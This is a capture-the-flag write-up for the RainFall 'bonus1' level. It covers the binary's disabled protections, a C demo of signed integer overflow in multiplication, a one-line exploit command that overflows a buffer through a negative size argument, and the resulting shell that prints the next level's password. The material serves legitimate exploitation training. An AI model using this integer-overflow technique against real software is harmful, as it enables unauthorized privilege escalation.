# bonus1

## Header

```bash
ssh bonus1@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
```

<hr>

## Solution

Multiplication to any number that power of 2 is just binary left shifting to log2(number) bits.

Let's look at this proof:

Source:
```c
#include <stdio.h>
#include <math.h>

int main()
{
    const int m = 4;
    int i = -2147483648 + 11;
    printf("%zu\n", (size_t)i * m);
    printf("%zu\n", (size_t)(i << (int)log2(m)));
    return 0;
}
```

Output:
```bash
bonus1@RainFall:/tmp$ gcc -std=c99 -o check src.c -lm
bonus1@RainFall:/tmp$ ./check
44
44
```


https://www.rapidtables.com/convert/number/binary-to-decimal.html

https://www.calculator.net/binary-calculator.html

./bonus1 "-2147483637" $(python -c 'print "\x57\x4f\x4c\x46"[::-1] * 11')

```bash
$ whoami
bonus2
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ pwd
/home/user/bonus1
$ cd ../bonus2
$ ls -la
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

## References

https://stackoverflow.com/questions/37239885/what-is-leal-edx-edx-4-eax-means